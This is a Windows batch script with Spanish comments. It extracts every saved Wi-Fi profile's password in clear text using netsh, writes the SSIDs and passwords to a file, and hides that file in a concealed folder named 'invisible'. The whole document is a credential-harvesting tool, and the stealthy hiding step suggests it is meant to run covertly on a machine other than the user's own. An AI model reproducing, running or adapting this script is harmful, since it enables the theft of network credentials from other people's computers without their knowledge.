@echo off

netsh wlan show profiles | findstr /C:"Perfil de todos los usuarios" > a.txt

for /F "tokens=2 delims=:" %%a in (a.txt) do (
    set "profile=%%a"
    setlocal enabledelayedexpansion
    echo SSID: !profile:~1! >> wpsd.txt
    netsh wlan show profile name="!profile:~1!" key=clear | findstr /C:"Contenido de la clave" >> temp_pwsd.txt
    for /F "tokens=2 delims=:" %%b in (temp_pwsd.txt) do (
        echo PWD: %%b >> wpsd.txt
    )
    del temp_pwsd.txt
    echo ----------------------------------------- >> wpsd.txt
    endlocal
)

del a.txt

REM Script para crear una carpeta oculta llamada "invisible" en el directorio actual
REM y mover el archivo "pwsd.txt" a esa carpeta.

REM --- Configuración ---
set "outputFolder=invisible"
set "sourceFile=wpsd.txt"

REM --- Crear carpeta oculta en el directorio actual ---
md "%outputFolder%"
attrib +h "%outputFolder%"

REM --- Mover el archivo "pwsd.txt" a la carpeta oculta ---
if exist "%sourceFile%" (
    move "%sourceFile%" "%outputFolder%"
    echo Archivo "%sourceFile%" movido a la carpeta oculta "%outputFolder%".
) else (
    echo El archivo "%sourceFile%" no fue encontrado en el directorio actual.
)


exit